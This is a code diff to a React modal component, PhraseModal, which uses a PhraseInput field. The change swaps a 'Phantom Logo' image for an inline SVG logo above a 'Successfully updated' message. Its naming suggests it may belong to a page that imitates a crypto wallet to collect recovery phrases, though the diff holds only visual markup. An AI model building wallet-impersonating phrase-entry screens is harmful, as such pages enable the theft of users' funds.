@@ -1,3 +1,4 @@
+
 import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { HelpCircle } from "lucide-react";
 import PhraseInput from "./PhraseInput";
@@ -19,11 +20,14 @@ const PhraseModal = ({ isOpen, onClose }: PhraseModalProps) => {
           </div>
           
           <div className="flex justify-center my-5">
-            <img 
-              src="/images/670d48e5d7171705c66af68c_Vector.png" 
-              alt="Phantom Logo" 
-              className="w-32 h-32"
-            />
+            <div className="bg-black rounded-full p-8">
+              <div className="w-20 h-20">
+                <svg width="100%" height="100%" viewBox="0 0 128 128" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M64 2C29.8 2 2 29.8 2 64c0 4.3.5 8.5 1.2 12.6h37.5c7.8 0 14.1 6.3 14.1 14.1v2.8h18.5v-2.8c0-7.8 6.3-14.1 14.1-14.1h37.4c.9-4.1 1.2-8.3 1.2-12.6 0-34.2-27.8-62-62-62z" fill="white"></path>
+                  <path d="M88.3 50.6H74.5V35c0-2.8-2.3-5-5-5H58.5c-2.8 0-5.1 2.2-5.1 5v15.6H39.6c-2.8 0-5 2.3-5 5v11c0 2.8 2.2 5 5 5h13.8v15.6c0 2.7 2.3 5 5.1 5h11c2.7 0 5-2.3 5-5V66.6h13.8c2.7 0 5-2.2 5-5v-11c0-2.7-2.3-5-5-5z" fill="white"></path>
+                </svg>
+              </div>
+            </div>
           </div>
           
           <h2 className="text-3xl font-bold text-white mb-3 text-center">Successfully updated</h2>
